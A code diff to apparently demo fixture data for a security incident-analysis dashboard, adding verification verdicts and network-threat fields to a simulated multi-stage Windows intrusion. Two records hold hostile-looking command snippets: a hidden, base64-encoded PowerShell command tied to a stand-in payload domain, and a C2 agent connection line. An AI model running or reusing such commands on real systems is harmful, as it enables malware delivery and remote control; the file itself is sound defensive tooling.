@@ -36,6 +36,23 @@ export const DEMO_INCIDENTS: Incident[] = [
     summary: "Multi-stage intrusion beginning with macro-enabled document execution on executive workstation WS-EXEC-04, escalating through LSASS memory dumping, NTLM pass-the-hash to production application server, and directory replication (DCSync) targeting DC01.CORP.LOCAL.",
     planted_attack_id: "PLANTED_APT_03",
     is_planted_match: true,
+    fp_verification: {
+      verdict: "CONFIRMED_MALICIOUS_ATTACK",
+      attack_confidence: 0.94,
+      false_positive_risk: 0.06,
+      corroboration_score: 0.95,
+      is_admin_tool_signature: false,
+      objective_achieved: true,
+      multi_stage_depth: 7,
+      explanation_points: [
+        "Multi-sensor corroboration: Confirmed across Sysmon Telemetry, Windows Security Event Log, and Zeek Network Monitor.",
+        "Multi-host intrusion: Activity spans 3 distinct endpoints (DC01.CORP.LOCAL, SRV-APP-PROD01, WS-EXEC-04).",
+        "Causal graph integrity: Reconstructed with 7 causal progression edges.",
+        "Adversarial objective verified: Credential Dumping / Memory Extraction (LSASS/NTDS).",
+        "Adversarial objective verified: Lateral Execution Tooling (Pass-the-Hash & Remote Service).",
+        "Zero benign administration match: Process hierarchy and execution arguments diverge completely from corporate deployment baselines."
+      ]
+    },
     dq_caveats: [
       {
         type: "TIMESTAMP_UNCERTAIN",
@@ -151,7 +168,17 @@ export const DEMO_INCIDENT_DETAIL: IncidentDetail = {
       rule_name: "Office Application Spawning Script Interpreter",
       explanation: "winword.exe (PID 3104) spawned powershell.exe with an obfuscated base64-encoded command line, typical of weaponized document macro execution.",
       evidence_event_uids: ["EVT-WIN-4688-9102", "EVT-SYSMON-001-4412"],
-      dq_flags: []
+      dq_flags: [],
+      network_threat: {
+        destination_ip: "198.51.100.24",
+        destination_port: 443,
+        destination_domain: "evil-payload.cdn-update.com",
+        network_protocol: "HTTPS",
+        threat_category: "MALICIOUS_DROP_SITE",
+        threat_confidence: 0.94,
+        direction: "OUTBOUND",
+        command_snippet: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFxAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA..."
+      }
     },
     {
       step_uid: "STEP-002",
@@ -350,7 +377,17 @@ export const DEMO_INCIDENT_DETAIL: IncidentDetail = {
       explanation: "Regular periodic TLS connections established to external C2 IP 198.51.100.44 with 30s jitter interval (15% variance).",
       evidence_event_uids: ["EVT-ZEEK-SSL-0914", "EVT-FW-OUT-55201"],
       is_uncertain: false,
-      dq_flags: ["TIMESTAMP_UNCERTAIN"]
+      dq_flags: ["TIMESTAMP_UNCERTAIN"],
+      network_threat: {
+        destination_ip: "198.51.100.44",
+        destination_port: 443,
+        destination_domain: "c2.stealth-ops.net",
+        network_protocol: "HTTPS",
+        threat_category: "C2_BEACONING",
+        threat_confidence: 0.96,
+        direction: "OUTBOUND",
+        command_snippet: "C:\\Windows\\Temp\\svc_agent.exe --connect 198.51.100.44:443"
+      }
     }
   ],
   edges: [
